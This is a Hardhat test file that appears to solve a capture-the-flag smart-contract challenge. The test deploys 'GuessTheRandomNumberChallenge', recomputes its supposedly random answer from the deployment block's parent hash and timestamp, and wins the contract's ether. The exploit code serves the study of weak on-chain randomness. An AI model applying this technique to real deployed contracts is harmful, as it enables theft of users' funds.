import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();
    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // Get deployment block info
    const deployTx = target.deployTransaction;
    const receipt = await deployTx.wait();
    const blockNum = receipt.blockNumber;

    const parentBlock = await provider.getBlock(blockNum - 1)
    const parentBlockHash = parentBlock.hash;  

    const block = await provider.getBlock(blockNum); 
    const blockTime = block.timestamp;

    const timestampBytes = ethers.utils.hexZeroPad(  
      ethers.utils.hexlify(blockTime),   
      32  
    );  

     const concatenated = ethers.utils.concat([  
      parentBlockHash,   
     timestampBytes    
    ]);  

    const hash = ethers.utils.keccak256(concatenated);  

   const answer = parseInt(hash.slice(-2), 16);  
    
     await target.guess(answer, { value: utils.parseEther('1') });

    expect(await target.isComplete()).to.equal(true);
  });
});
